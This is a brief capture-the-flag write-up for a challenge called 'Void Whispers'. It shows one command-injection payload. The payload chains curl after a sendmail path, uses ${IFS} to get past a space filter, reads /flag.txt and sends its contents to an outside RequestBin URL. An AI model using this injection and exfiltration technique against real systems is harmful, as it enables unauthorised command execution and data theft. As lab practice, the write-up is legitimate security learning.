# Void Whispers
The unique validation in this challege is:
<img width="1049" height="513" alt="image" src="https://github.com/user-attachments/assets/d521b73d-f2ff-4cd2-bff7-2deeed50f6de" />

So, I create a payload to do a curl a [RequestBin](https://requestbin.whapi.cloud/wmgz5fwm?inspect) to get tha flag
```bash
/usr/sbin/sendmail;curl${IFS}http://requestbin.whapi.cloud/wmgz5fwm?flag=$(cat${IFS}/flag.txt)
```
